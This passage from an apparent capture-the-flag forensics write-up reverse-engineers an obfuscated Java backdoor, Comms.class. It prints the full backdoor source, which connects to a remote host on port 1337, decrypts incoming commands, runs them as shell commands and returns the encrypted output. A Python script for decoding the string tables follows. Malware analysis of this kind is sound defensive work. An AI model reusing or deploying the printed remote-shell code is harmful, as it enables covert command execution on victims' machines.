3LJEk9miaXkjTsBYnqDUCmgyGNjkwZS3uSehYfSZhuEqtmJEfoR6XW9bJgr0OGgRopnr4g0bnSQnJMKT0KzEoHNdRq0csNboUtJKRXVk8oDmQ5oKkcpgPynZPLPPZKPVGgnCTMmYPQsKHnUNZUISRT0l+fzxX3pCIKU2ZTglM1AlAPIm1gM3b0cV38OS4nah8KE7EZBt5FS3qSlx0knk63Ap2tdNQ7+I0Iw/dks3CmGmrF9RA01veJRZ6Rog1vYW1tUYifIlRTBg/e5o8mdPqSiSJMjtTSyfpdQ7ciNUrtTHFAgg7C1Y3Mlr0/SZEgjjtrIwwHZXyPm6TRkB3n2b8NXVLm7UDvBqUo9dz/5qblmBY6rOoeVjQTsQ4BBmnDtdtJWtCzWLuVExUX2Opnu5HYOCC+ijKTyt0rUtdBSjfIfBPQrDPQG83BNC7TQL0cknUHnPdC161PGpa5pO/scuz+TaZjNcN79HnVeNORN+xtc/ETsLyAIhGExAqF2d5PczNkjRSeYrqPpuYptMVayT2PYeVadCST6h9laT86mLg";
            String var1 = "/tmp/Comms.class";
            decryptToFile(var0, var1);
        } catch (Exception var2) {
            var2.printStackTrace();
        }

    }
}

```
{% endcode %}

The code above will decrypt the value of `var0` variable using AES ECB using the first 16 characters of the flag and saving the result to `/tmp/Comms.class`. Since we already got the first flag, we can decrypt it.&#x20;

After decompiling the `Comms.class` file we got this code below.

{% code title="" %}
```java
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.lang.reflect.Method;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Comms {
    // $FF: synthetic field
    private static final String[] I;
    // $FF: synthetic field
    private static final String XXX;
    // $FF: synthetic field
    private static final String YYY;
    // $FF: synthetic field
    private static final int[] l;

    private static void IIl() {
        l = new int[32];
        l[0] = (21 + 181 - 65 + 113 ^ 46 + 154 - 161 + 126) & (151 ^ 185 ^ 77 ^ 60 ^ -" ".length());
        l[1] = "  ".length();
        l[2] = " ".length();
        l[3] = "   ".length();
        l[4] = 85 ^ 49 ^ 163 ^ 195;
        l[5] = 127 ^ 122;
        l[6] = 104 ^ 110;
        l[7] = 87 + 12 - -35 + 36 ^ 83 + 116 - 132 + 106;
        l[8] = 24 ^ 16;
        l[9] = 182 + 39 - 48 + 11 ^ 50 + 91 - 39 + 75;
        l[10] = 19 ^ 65 ^ 1 ^ 89;
        l[11] = 92 ^ 87;
        l[12] = 50 ^ 62;
        l[13] = 71 ^ 74;
        l[14] = 27 ^ 21;
        l[15] = 146 ^ 157;
        l[16] = 161 ^ 174 ^ 144 ^ 143;
        l[17] = 141 ^ 156;
        l[18] = 73 ^ 91;
        l[19] = 95 ^ 99 ^ 187 ^ 148;
        l[20] = 124 ^ 104;
        l[21] = 203 ^ 192 ^ 189 ^ 163;
        l[22] = 1 ^ 104 ^ 108 + 36 - 21 + 4;
        l[23] = 47 ^ 24 ^ 137 ^ 169;
        l[24] = 120 ^ 117 ^ 13 ^ 24;
        l[25] = 59 + 50 - 57 + 83 ^ 3 + 96 - -11 + 48;
        l[26] = 142 + 117 - 184 + 113 ^ 153 + 63 - 187 + 137;
        l[27] = -8257 & 9593;
        l[28] = 26 ^ 1;
        l[29] = 105 ^ 96 ^ 39 ^ 50;
        l[30] = 41 ^ 52;
        l[31] = 135 + 73 - 150 + 88 ^ 21 + 88 - 1 + 32;
    }

    private static void ll() {
        I = new String[l[31]];
        I[l[0]] = I("eBq0gvhn60zfo1MunQjxEq+VgKjg5XsIv3e9pz85TDc=", "nErxg");
        I[l[2]] = l("XnpOLQlfekJ7XFwhTC8NXQ==", "nCzKk");
        I[l[1]] = I("7Ep1Z+Gia+U=", "UWraX");
        I[l[3]] = l("GxQcABJfFhgYGgUaRCIDAR0PEw==", "qujaj");
        I[l[4]] = l("AjwsJhwWLTkBEQA=", "eYXor");
        I[l[5]] = l("Ewc5RxARAEU4HhERXzg0NiYDBjI=", "RBjhU");
        I[l[6]] = l("Lx8HDA==", "FqnxZ");
        I[l[7]] = I("GHxTbaCWgquBBBSGerx+TiFBtURhB40u", "KcZiK");
        I[l[8]] = Il("Cf4KGA89+bA=", "uMCDA");
        I[l[9]] = Il("o1OzBtlndQ+3+IyNY+3z+HrXBauLHpzj", "OaiGN");
        I[l[10]] = Il("R5lwGFYcS7eccTUFCOhdLg==", "KunRL");
        I[l[11]] = l("ERwyKBERJj4UAQYbPyA=", "trQGu");
        I[l[12]] = Il("2/vFTel4NG6ys7fiFcHEt0wZOsC1vJqXP5GHiA7T9jE=", "dhvCA");
        I[l[13]] = l("fV1yEhJ8XX5ER38GcBAWfg==", "MdFtp");
        I[l[14]] = l("AwoL", "BOXvi");
        I[l[15]] = Il("kqsvxVHphdfXglIktDCFoHPv2dha64mD", "YbUwj");
        I[l[16]] = l("Lg8VPC86HgAbIiw=", "IjauA");
        I[l[17]] = Il("vLru125xRYdTLHj1VD9qtUsvKbrijfbX", "RqduM");
        I[l[18]] = Il("xRwDzYljVIU=", "fScWC");
        I[l[19]] = l("EAkMJl8JDRkyAxMcA2k6HxE=", "zhzGq");
        I[l[20]] = l("LyQVKDwqJw==", "KKSAR");
        I[l[21]] = l("CwkvD2gUHDACaCMJKgtwVQ==", "ahYnF");
        I[l[22]] = Il("uIHhwTaeAscF3EzVgdL4zg==", "tMxGZ");
        I[l[23]] = l("ChYmChAL", "nsEet");
        I[l[24]] = l("al9YAjJrX1RUZ2gEWgA2aQ==", "ZfldP");
        I[l[25]] = l("JygSTjMlL24xPSU+dDEXAgkoDxE=", "fmAav");
        I[l[26]] = I("EvA8rhxJMXPTCc0Wno5a9Q==", "QvZtB");
        I[l[28]] = l("OTAxITtw", "zxtbp");
        I[l[29]] = Il("gT9cJw1pjVI=", "eTlqI");
        I[l[30]] = I("BAW3Glpb798=", "pExyG");
    }

    private static boolean lll(int var0, int var1) {
        return var0 < var1;
    }

    static {
        IIl();
        ll();
        XXX = I[l[24]];
        YYY = I[l[25]];

        try {
            Socket llIlllIllllllll = new Socket(I[l[26]], l[27]);

            try {
                BufferedReader IlIlllIllllllll = new BufferedReader(
                        new InputStreamReader(llIlllIllllllll.getInputStream()));

                try {
                    BufferedWriter lIIlllIllllllll = new BufferedWriter(
                            new OutputStreamWriter(llIlllIllllllll.getOutputStream()));

                    try {
                        do {
                            lIIlllIllllllll.write(I[l[28]]);
                            lIIlllIllllllll.flush();
                            boolean IIIlllIllllllll = IlIlllIllllllll.readLine();
                            if (lIl(IIIlllIllllllll) && Ill(IIIlllIllllllll.isEmpty())) {
                                Exception lllIllIllllllll = decrypt(IIIlllIllllllll);
                                double IllIllIllllllll = Runtime.getRuntime().exec(lllIllIllllllll);
                                int lIlIllIllllllll = new BufferedReader(
                                        new InputStreamReader(IllIllIllllllll.getInputStream()));
                                StringBuilder IIlIllIllllllll = new StringBuilder();

                                String llIIllIllllllll;
                                while (lIl(llIIllIllllllll = lIlIllIllllllll.readLine())) {
                                    IIlIllIllllllll.append(llIIllIllllllll).append(I[l[29]]);
                                    "".length();
                                    "".length();
                                    if (-"   ".length() >= 0) {
                                        return;
                                    }
                                }

                                boolean IlIIllIllllllll = encrypt(String.valueOf(IIlIllIllllllll));
                                lIIlllIllllllll.write(
                                        String.valueOf((new StringBuilder()).append(IlIIllIllllllll).append(I[l[30]])));
                                lIIlllIllllllll.flush();
                            }

                            Thread.sleep(5000L);
                            "".length();
                        } while ((107 ^ 111) >= "   ".length());

                    } catch (Throwable var13) {
                        label61: {
                            try {
                                lIIlllIllllllll.close();
                            } catch (Throwable var12) {
                                var13.addSuppressed(var12);
                                break label61;
                            }

                            "".length();
                            if ("  ".length() < 0) {
                                return;
                            }
                        }

                        throw var13;
                    }
                } catch (Throwable var14) {
                    label56: {
                        try {
                            IlIlllIllllllll.close();
                        } catch (Throwable var11) {
                            var14.addSuppressed(var11);
                            break label56;
                        }

                        "".length();
                        if (((4 + 93 - 74 + 114 ^ 54 + 50 - -65 + 28) & (101 ^ 120 ^ 60 ^ 109 ^ -" ".length())) < 0) {
                            return;
                        }
                    }

                    throw var14;
                }
            } catch (Throwable var15) {
                label51: {
                    try {
                        llIlllIllllllll.close();
                    } catch (Throwable var10) {
                        var15.addSuppressed(var10);
                        break label51;
                    }

                    "".length();
                    if ("  ".length() != "  ".length()) {
                        return;
                    }
                }

                throw var15;
            }
        } catch (Exception var16) {
            var16.printStackTrace();
        }
    }

    private static String encrypt(String llllIllllllllll) throws Exception {
        byte IlllIllllllllll = Class.forName(I[l[0]]);
        Class[] var10001 = new Class[l[1]];
        var10001[l[0]] = byte[].class;
        var10001[l[2]] = String.class;
        short lIllIllllllllll = IlllIllllllllll.getConstructor(var10001);
        Object[] var14 = new Object[l[1]];
        var14[l[0]] = I[l[2]].getBytes();
        var14[l[2]] = I[l[1]];
        long IIllIllllllllll = lIllIllllllllll.newInstance(var14);
        int llIlIllllllllll = Class.forName(I[l[3]]);
        String var15 = I[l[4]];
        Class[] var10002 = new Class[l[2]];
        var10002[l[0]] = String.class;
        double IlIlIllllllllll = llIlIllllllllll.getMethod(var15, var10002);
        Object[] var16 = new Object[l[2]];
        var16[l[0]] = I[l[5]];
        double lIIlIllllllllll = IlIlIllllllllll.invoke((Object) null, var16);
        var15 = I[l[6]];
        var10002 = new Class[l[1]];
        var10002[l[0]] = Integer.TYPE;
        var10002[l[2]] = Class.forName(I[l[7]]);
        byte IIIlIllllllllll = llIlIllllllllll.getMethod(var15, var10002);
        var16 = new Object[l[1]];
        var16[l[0]] = l[2];
        var16[l[2]] = IIllIllllllllll;
        IIIlIllllllllll.invoke(lIIlIllllllllll, var16);
        "".length();
        var15 = I[l[8]];
        var10002 = new Class[l[2]];
        var10002[l[0]] = byte[].class;
        char lllIIllllllllll = llIlIllllllllll.getMethod(var15, var10002);
        var16 = new Object[l[2]];
        var16[l[0]] = llllIllllllllll.getBytes();
        int IllIIllllllllll = (byte[]) lllIIllllllllll.invoke(lIIlIllllllllll, var16);
        Exception lIlIIllllllllll = Class.forName(I[l[9]]);
        double IIlIIllllllllll = lIlIIllllllllll.getMethod(I[l[10]]);
        double llIIIllllllllll = IIlIIllllllllll.invoke((Object) null);
        Class var10000 = llIIIllllllllll.getClass();
        var15 = I[l[11]];
        var10002 = new Class[l[2]];
        var10002[l[0]] = byte[].class;
        Method IlIIIllllllllll = var10000.getMethod(var15, var10002);
        var16 = new Object[l[2]];
        var16[l[0]] = IllIIllllllllll;
        return (String) IlIIIllllllllll.invoke(llIIIllllllllll, var16);
    }

    private static String I(String IIIlIlIllllllll, String lllIIlIllllllll) {
        try {
            SecretKeySpec lIllIlIllllllll = new SecretKeySpec(
                    MessageDigest.getInstance("MD5").digest(lllIIlIllllllll.getBytes(StandardCharsets.UTF_8)),
                    "Blowfish");
            Cipher IIllIlIllllllll = Cipher.getInstance("Blowfish");
            IIllIlIllllllll.init(l[1], lIllIlIllllllll);
            return new String(
                    IIllIlIllllllll
                            .doFinal(Base64.getDecoder().decode(IIIlIlIllllllll.getBytes(StandardCharsets.UTF_8))),
                    StandardCharsets.UTF_8);
        } catch (Exception var4) {
            var4.printStackTrace();
            return null;
        }
    }

    private static String Il(String llIllIIllllllll, String IIlllIIllllllll) {
        try {
            byte lIIllIIllllllll = new SecretKeySpec(Arrays.copyOf(
                    MessageDigest.getInstance("MD5").digest(IIlllIIllllllll.getBytes(StandardCharsets.UTF_8)), l[8]),
                    "DES");
            Exception IIIllIIllllllll = Cipher.getInstance("DES");
            IIIllIIllllllll.init(l[1], lIIllIIllllllll);
            return new String(
                    IIIllIIllllllll
                            .doFinal(Base64.getDecoder().decode(llIllIIllllllll.getBytes(StandardCharsets.UTF_8))),
                    StandardCharsets.UTF_8);
        } catch (Exception var4) {
            var4.printStackTrace();
            return null;
        }
    }

    private static String l(String lIllIIIllllllll, String lllIIIIllllllll) {
        lIllIIIllllllll = new String(Base64.getDecoder().decode(lIllIIIllllllll.getBytes(StandardCharsets.UTF_8)),
                StandardCharsets.UTF_8);
        byte IllIIIIllllllll = new StringBuilder();
        short lIlIIIIllllllll = lllIIIIllllllll.toCharArray();
        int lIIlIIIllllllll = l[0];
        boolean llIIIIIllllllll = lIllIIIllllllll.toCharArray();
        boolean IlIIIIIllllllll = llIIIIIllllllll.length;
        int lIIIIIIllllllll = l[0];

        do {
            if (!lll(lIIIIIIllllllll, IlIIIIIllllllll)) {
                return String.valueOf(IllIIIIllllllll);
            }

            char IlllIIIllllllll = llIIIIIllllllll[lIIIIIIllllllll];
            IllIIIIllllllll
                    .append((char) (IlllIIIllllllll ^ lIlIIIIllllllll[lIIlIIIllllllll % lIlIIIIllllllll.length]));
            "".length();
            ++lIIlIIIllllllll;
            ++lIIIIIIllllllll;
            "".length();
        } while ((188 ^ 184) >= "  ".length());

        return null;
    }

    private static boolean Ill(int var0) {
        return var0 == 0;
    }

    private static String decrypt(String llIIlIlllllllll) throws Exception {
        double IlIIlIlllllllll = Class.forName(I[l[12]]);
        Class[] var10001 = new Class[l[1]];
        var10001[l[0]] = byte[].class;
        var10001[l[2]] = String.class;
        String lIIIlIlllllllll = IlIIlIlllllllll.getConstructor(var10001);
        Object[] var15 = new Object[l[1]];
        var15[l[0]] = I[l[13]].getBytes();
        var15[l[2]] = I[l[14]];
        String IIIIlIlllllllll = lIIIlIlllllllll.newInstance(var15);
        long llllIIlllllllll = Class.forName(I[l[15]]);
        String var16 = I[l[16]];
        Class[] var10002 = new Class[l[2]];
        var10002[l[0]] = String.class;
        double IlllIIlllllllll = llllIIlllllllll.getMethod(var16, var10002);
        Object[] var17 = new Object[l[2]];
        var17[l[0]] = I[l[17]];
        byte lIllIIlllllllll = IlllIIlllllllll.invoke((Object) null, var17);
        var16 = I[l[18]];
        var10002 = new Class[l[1]];
        var10002[l[0]] = Integer.TYPE;
        var10002[l[2]] = Class.forName(I[l[19]]);
        short IIllIIlllllllll = llllIIlllllllll.getMethod(var16, var10002);
        var17 = new Object[l[1]];
        var17[l[0]] = l[1];
        var17[l[2]] = IIIIlIlllllllll;
        IIllIIlllllllll.invoke(lIllIIlllllllll, var17);
        "".length();
        var16 = I[l[20]];
        var10002 = new Class[l[2]];
        var10002[l[0]] = byte[].class;
        byte llIlIIlllllllll = llllIIlllllllll.getMethod(var16, var10002);
        float IlIlIIlllllllll = Class.forName(I[l[21]]);
        byte lIIlIIlllllllll = IlIlIIlllllllll.getMethod(I[l[22]]);
        String IIIlIIlllllllll = lIIlIIlllllllll.invoke((Object) null);
        Class var10000 = IIIlIIlllllllll.getClass();
        var16 = I[l[23]];
        var10002 = new Class[l[2]];
        var10002[l[0]] = String.class;
        double lllIIIlllllllll = var10000.getMethod(var16, var10002);
        var17 = new Object[l[2]];
        var17[l[0]] = llIIlIlllllllll;
        byte[] IllIIIlllllllll = (byte[]) lllIIIlllllllll.invoke(IIIlIIlllllllll, var17);
        Object[] var10004 = new Object[l[2]];
        var10004[l[0]] = IllIIIlllllllll;
        return new String((byte[]) llIlIIlllllllll.invoke(lIllIIlllllllll, var10004));
    }

    private static boolean lIl(Object var0) {
        return var0 != null;
    }
}

```
{% endcode %}

Since this code is heavily obfuscated, we can start from a function that is independent (does not rely on other functions), which is the `IIl` function.

```java
private static void IIl() {
    l = new int[32];
    l[0] = (21 + 181 - 65 + 113 ^ 46 + 154 - 161 + 126) & (151 ^ 185 ^ 77 ^ 60 ^ -" ".length());
    l[1] = "  ".length();
    l[2] = " ".length();
    l[3] = "   ".length();
    l[4] = 85 ^ 49 ^ 163 ^ 195;
    l[5] = 127 ^ 122;
    l[6] = 104 ^ 110;
    l[7] = 87 + 12 - -35 + 36 ^ 83 + 116 - 132 + 106;
    l[8] = 24 ^ 16;
    l[9] = 182 + 39 - 48 + 11 ^ 50 + 91 - 39 + 75;
    l[10] = 19 ^ 65 ^ 1 ^ 89;
    l[11] = 92 ^ 87;
    l[12] = 50 ^ 62;
    l[13] = 71 ^ 74;
    l[14] = 27 ^ 21;
    l[15] = 146 ^ 157;
    l[16] = 161 ^ 174 ^ 144 ^ 143;
    l[17] = 141 ^ 156;
    l[18] = 73 ^ 91;
    l[19] = 95 ^ 99 ^ 187 ^ 148;
    l[20] = 124 ^ 104;
    l[21] = 203 ^ 192 ^ 189 ^ 163;
    l[22] = 1 ^ 104 ^ 108 + 36 - 21 + 4;
    l[23] = 47 ^ 24 ^ 137 ^ 169;
    l[24] = 120 ^ 117 ^ 13 ^ 24;
    l[25] = 59 + 50 - 57 + 83 ^ 3 + 96 - -11 + 48;
    l[26] = 142 + 117 - 184 + 113 ^ 153 + 63 - 187 + 137;
    l[27] = -8257 & 9593;
    l[28] = 26 ^ 1;
    l[29] = 105 ^ 96 ^ 39 ^ 50;
    l[30] = 41 ^ 52;
    l[31] = 135 + 73 - 150 + 88 ^ 21 + 88 - 1 + 32;
}
```

This code is just basically initializing a new integer array variable with length of 32 and inserting values to them. We can just run the code and see the value of `l` to see the value of every element. The value is given below for reference.

`[0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1337, 27, 28, 29, 30]`

The next function is the `ll` function, where some Base64 strings are being fed to one of three functions to do some operation and stored in a string array variable. The three functions are `I`, `l`, and `Il`.

```java
private static void ll() {
    I = new String[l[31]];
    I[l[0]] = I("eBq0gvhn60zfo1MunQjxEq+VgKjg5XsIv3e9pz85TDc=", "nErxg");
    I[l[2]] = l("XnpOLQlfekJ7XFwhTC8NXQ==", "nCzKk");
    I[l[1]] = I("7Ep1Z+Gia+U=", "UWraX");
    I[l[3]] = l("GxQcABJfFhgYGgUaRCIDAR0PEw==", "qujaj");
    I[l[4]] = l("AjwsJhwWLTkBEQA=", "eYXor");
    I[l[5]] = l("Ewc5RxARAEU4HhERXzg0NiYDBjI=", "RBjhU");
    I[l[6]] = l("Lx8HDA==", "FqnxZ");
    I[l[7]] = I("GHxTbaCWgquBBBSGerx+TiFBtURhB40u", "KcZiK");
    I[l[8]] = Il("Cf4KGA89+bA=", "uMCDA");
    I[l[9]] = Il("o1OzBtlndQ+3+IyNY+3z+HrXBauLHpzj", "OaiGN");
    I[l[10]] = Il("R5lwGFYcS7eccTUFCOhdLg==", "KunRL");
    I[l[11]] = l("ERwyKBERJj4UAQYbPyA=", "trQGu");
    I[l[12]] = Il("2/vFTel4NG6ys7fiFcHEt0wZOsC1vJqXP5GHiA7T9jE=", "dhvCA");
    I[l[13]] = l("fV1yEhJ8XX5ER38GcBAWfg==", "MdFtp");
    I[l[14]] = l("AwoL", "BOXvi");
    I[l[15]] = Il("kqsvxVHphdfXglIktDCFoHPv2dha64mD", "YbUwj");
    I[l[16]] = l("Lg8VPC86HgAbIiw=", "IjauA");
    I[l[17]] = Il("vLru125xRYdTLHj1VD9qtUsvKbrijfbX", "RqduM");
    I[l[18]] = Il("xRwDzYljVIU=", "fScWC");
    I[l[19]] = l("EAkMJl8JDRkyAxMcA2k6HxE=", "zhzGq");
    I[l[20]] = l("LyQVKDwqJw==", "KKSAR");
    I[l[21]] = l("CwkvD2gUHDACaCMJKgtwVQ==", "ahYnF");
    I[l[22]] = Il("uIHhwTaeAscF3EzVgdL4zg==", "tMxGZ");
    I[l[23]] = l("ChYmChAL", "nsEet");
    I[l[24]] = l("al9YAjJrX1RUZ2gEWgA2aQ==", "ZfldP");
    I[l[25]] = l("JygSTjMlL24xPSU+dDEXAgkoDxE=", "fmAav");
    I[l[26]] = I("EvA8rhxJMXPTCc0Wno5a9Q==", "QvZtB");
    I[l[28]] = l("OTAxITtw", "zxtbp");
    I[l[29]] = Il("gT9cJw1pjVI=", "eTlqI");
    I[l[30]] = I("BAW3Glpb798=", "pExyG");
}
```

Next up is to deobfuscate the three functions. Let's start with the `I` function.

```java
private static String I(String IIIlIlIllllllll, String lllIIlIllllllll) {
    try {
        SecretKeySpec lIllIlIllllllll = new SecretKeySpec(
                MessageDigest.getInstance("MD5").digest(lllIIlIllllllll.getBytes(StandardCharsets.UTF_8)),
                "Blowfish");
        Cipher IIllIlIllllllll = Cipher.getInstance("Blowfish");
        IIllIlIllllllll.init(l[1], lIllIlIllllllll);
        return new String(
                IIllIlIllllllll
                        .doFinal(Base64.getDecoder().decode(IIIlIlIllllllll.getBytes(StandardCharsets.UTF_8))),
                StandardCharsets.UTF_8);
    } catch (Exception var4) {
        var4.printStackTrace();
        return null;
    }
}
```

From the code above, we can conclude that this function is to encrypt the Base64-decoded value of first argument with Blowfish using the MD5 hash of the Base64-decoded value of the second argument as the key.

The `Il` function has the same structure but using DES instead of Blowfish.

```java
private static String Il(String llIllIIllllllll, String IIlllIIllllllll) {
    try {
        byte lIIllIIllllllll = new SecretKeySpec(Arrays.copyOf(
                MessageDigest.getInstance("MD5").digest(IIlllIIllllllll.getBytes(StandardCharsets.UTF_8)), l[8]),
                "DES");
        Exception IIIllIIllllllll = Cipher.getInstance("DES");
        IIIllIIllllllll.init(l[1], lIIllIIllllllll);
        return new String(
                IIIllIIllllllll
                        .doFinal(Base64.getDecoder().decode(llIllIIllllllll.getBytes(StandardCharsets.UTF_8))),
                StandardCharsets.UTF_8);
    } catch (Exception var4) {
        var4.printStackTrace();
        return null;
    }
}
```

The `l` function is quite different from the other two, but it is just doing a basic XOR encryption of the Base64-decoded value of the first argument with the second argument.

Since the result of the operations are stored inside the `I`variable, we can do a regex replace on the `Comms.java` code using a script to ease readability.

```python
import re
import base64
from Crypto.Cipher import Blowfish, DES
from Crypto.Hash import MD5

l = [0] * 32
l[0] = (21 + 181 - 65 + 113 ^ 46 + 154 - 161 + 126) & (151 ^ 185 ^ 77 ^ 60 ^ -len(" "));
l[1] = len("  ");
l[2] = len(" ");
l[3] = len("   ");
l[4] = 85 ^ 49 ^ 163 ^ 195;
l[5] = 127 ^ 122;
l[6] = 104 ^ 110;
l[7] = 87 + 12 - -35 + 36 ^ 83 + 116 - 132 + 106;
l[8] = 24 ^ 16;
l[9] = 182 + 39 - 48 + 11 ^ 50 + 91 - 39 + 75;
l[10] = 19 ^ 65 ^ 1 ^ 89;
l[11] = 92 ^ 87;
l[12] = 50 ^ 62;
l[13] = 71 ^ 74;
l[14] = 27 ^ 21;
l[15] = 146 ^ 157;
l[16] = 161 ^ 174 ^ 144 ^ 143;
l[17] = 141 ^ 156;
l[18] = 73 ^ 91;
l[19] = 95 ^ 99 ^ 187 ^ 148;
l[20] = 124 ^ 104;
l[21] = 203 ^ 192 ^ 189 ^ 163;
l[22] = 1 ^ 104 ^ 108 + 36 - 21 + 4;
l[23] = 47 ^ 24 ^ 137 ^ 169;
l[24] = 120 ^ 117 ^ 13 ^ 24;
l[25] = 59 + 50 - 57 + 83 ^ 3 + 96 - -11 + 48;
l[26] = 142 + 117 - 184 + 113 ^ 153 + 63 - 187 + 137;
l[27] = -8257 & 9593;
l[28] = 26 ^ 1;
l[29] = 105 ^ 96 ^ 39 ^ 50;
l[30] = 41 ^ 52;
l[31] = 135 + 73 - 150 + 88 ^ 21 + 88 - 1 + 32;
I = [""] * l[31]

comms = open("Comms.java", "r").read()
blowfishes = re.findall(r'I\[l\[(\d+?)\]\] = I\("(.*?)", "(.*?)"\);', comms)
deses = re.findall(r'I\[l\[(\d+?)\]\] = Il\("(.*?)", "(.*?)"\);', comms)
xors = re.findall(r'I\[l\[(\d+?)\]\] = l\("(.*?)", "(.*?)"\);', comms)

for index, secret, key in blowfishes:
    secret = base64.b64decode(secret.encode("utf-8"))
    key = MD5.new(key.encode("utf-8")).digest()
    cipher = Blowfish.new(key, Blowfish.MODE_ECB)
    I[l[int(index)]] = cipher.decrypt(secret).decode("utf-8")

for index, secret, key in deses:
    secret = base64.b64decode(secret.encode("utf-8"))
    key = MD5.new(key.encode("utf-8")).digest()[:8]
    cipher = DES.new(key, DES.MODE_ECB)
    I[l[int(index)]] = cipher.decrypt(secret).decode("utf-8")

for index, secret, key in xors:
    secret = base64.b64decode(secret.encode("utf-8"))
    key = key.encode("utf-8")
    a = []
    for i in range(len(secret)):
        a.append(secret[i] ^ key[i % len(key)])
    I[l[int(index)]] = "".join(chr(x) for x in a)

print(re.sub(r'I\[l\[(\d+?)\]\]', lambda m: I[l[int(m.group(1))]], comms))
```

&#x20;The replaced code for the `decrypt` function is given below.

```java
private static String decrypt(String llIIlIlllllllll) throws Exception {
        double IlIIlIlllllllll = Class.forName(javax.crypto.spec.SecretKeySpec);
        Class[] var10001 = new Class[l[1]];
        var10001[l[0]] = byte[].class;
        var10001[l[2]] = String.class;
        String lIIIlIlllllllll = IlIIlIlllllllll.getConstructor(var10001);
        Object[] var15 = new Object[l[1]];
        var15[l[0]] = 094fb198072b6df3.getBytes();
        var15[l[2]] = AES;
        String IIIIlIlllllllll = lIIIlIlllllllll.newInstance(var15);
        long llllIIlllllllll = Class.forName(javax.crypto.Cipher);
        String var16 = getInstance;
        Class[] var10002 = new Class[l[2]];
        var10002[l[0]] = String.class;
        double IlllIIlllllllll = llllIIlllllllll.getMethod(var16, var10002);
        Object[] var17 = new Object[l[2]];
        var17[l[0]] = AES/ECB/PKCS5Padding;
        byte lIllIIlllllllll = IlllIIlllllllll.invoke((Object) null, var17);
        var16 = init;
        var10002 = new Class[l[1]];
        var10002[l[0]] = Integer.TYPE;
        var10002[l[2]] = Class.forName(java.security.Key);
        short IIllIIlllllllll = llllIIlllllllll.getMethod(var16, var10002);
        var17 = new Object[l[1]];
        var17[l[0]] = l[1];
        var17[l[2]] = IIIIlIlllllllll;
        IIllIIlllllllll.invoke(lIllIIlllllllll, var17);
        "".length();
        var16 = doFinal;
        var10002 = new Class[l[2]];
        var10002[l[0]] = byte[].class;
        byte llIlIIlllllllll = llllIIlllllllll.getMethod(var16, var10002);
        float IlIlIIlllllllll = Class.forName(java.util.Base64);
        byte lIIlIIlllllllll = IlIlIIlllllllll.getMethod(getDecoder);
        String IIIlIIlllllllll = lIIlIIlllllllll.invoke((Object) null);
        Class var10000 = IIIlIIlllllllll.getClass();
        var16 = decode;
        var10002 = new Class[l[2]];
        var10002[l[0]] = String.class;
        double lllIIIlllllllll = var10000.getMethod(var16, var10002);
        var17 = new Object[l[2]];
        var17[l[0]] = llIIlIlllllllll;
        byte[] IllIIIlllllllll = (byte[]) lllIIIlllllllll.invoke(IIIlIIlllllllll, var17);
        Object[] var10004 = new Object[l[2]];
        var10004[l[0]] = IllIIIlllllllll;
        return new String((byte[]) llIlIIlllllllll.invoke(lIllIIlllllllll, var10004));
    }
```

The code is also heavily obfuscated, but the main functionality is that it will decrypt the first argument with AES ECB using `094fb198072b6df3` as the secret key.

After finding out the workings of the functions, let's see the functionality of the main block.

```java
static {
    IIl();
    ll();
    XXX = I[l[24]];
    YYY = I[l[25]];

    try {
        Socket llIlllIllllllll = new Socket(I[l[26]], l[27]);

        try {
            BufferedReader IlIlllIllllllll = new BufferedReader(
                    new InputStreamReader(llIlllIllllllll.getInputStream()));

            try {
                BufferedWriter lIIlllIllllllll = new BufferedWriter(
                        new OutputStreamWriter(llIlllIllllllll.getOutputStream()));

                try {
                    do {
                        lIIlllIllllllll.write(I[l[28]]);
                        lIIlllIllllllll.flush();
                        boolean IIIlllIllllllll = IlIlllIllllllll.readLine();
                        if (lIl(IIIlllIllllllll) && Ill(IIIlllIllllllll.isEmpty())) {
                            Exception lllIllIllllllll = decrypt(IIIlllIllllllll);
                            double IllIllIllllllll = Runtime.getRuntime().exec(lllIllIllllllll);
                            int lIlIllIllllllll = new BufferedReader(
                                    new InputStreamReader(IllIllIllllllll.getInputStream()));
                            StringBuilder IIlIllIllllllll = new StringBuilder();

                            String llIIllIllllllll;
                            while (lIl(llIIllIllllllll = lIlIllIllllllll.readLine())) {
                                IIlIllIllllllll.append(llIIllIllllllll).append(I[l[29]]);
                                "".length();
                                "".length();
                                if (-"   ".length() >= 0) {
                                    return;
                                }
                            }

                            boolean IlIIllIllllllll = encrypt(String.valueOf(IIlIllIllllllll));
                            lIIlllIllllllll.write(
                                    String.valueOf((new StringBuilder()).append(IlIIllIllllllll).append(I[l[30]])));
                            lIIlllIllllllll.flush();
                        }

                        Thread.sleep(5000L);
                        "".length();
                    } while ((107 ^ 111) >= "   ".length());

                } catch (Throwable var13) {
                    label61: {
                        try {
                            lIIlllIllllllll.close();
                        } catch (Throwable var12) {
                            var13.addSuppressed(var12);
                            break label61;
                        }

                        "".length();
                        if ("  ".length() < 0) {
                            return;
                        }
                    }

                    throw var13;
                }
            } catch (Throwable var14) {
                label56: {
                    try {
                        IlIlllIllllllll.close();
                    } catch (Throwable var11) {
                        var14.addSuppressed(var11);
                        break label56;
                    }

                    "".length();
                    if (((4 + 93 - 74 + 114 ^ 54 + 50 - -65 + 28) & (101 ^ 120 ^ 60 ^ 109 ^ -" ".length())) < 0) {
                        return;
                    }
                }

                throw var14;
            }
        } catch (Throwable var15) {
            label51: {
                try {
                    llIlllIllllllll.close();
                } catch (Throwable var10) {
                    var15.addSuppressed(var10);
                    break label51;
                }

                "".length();
                if ("  ".length() != "  ".length()) {
                    return;
                }
            }

            throw var15;
        }
    } catch (Exception var16) {
        var16.printStackTrace();
    }
}
```

From the code, we can see the program will open a socket and when it receives something it will decode it from Base64, decrypt it using AES CBC and run it as a shell command. The result of the shell command will be encrypted, encoded using Base64 and sent through the socket.

The value port parameter of the socket is the 27th element of `l`, which is `1337`. From this information, we can filter out packets using this port on Wireshark to see if any communications are happening on the socket.

<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 153523.png" alt=""><figcaption><p>Communcation from the Comms.java program</p></figcaption></figure>

### Solution (Flag 2)

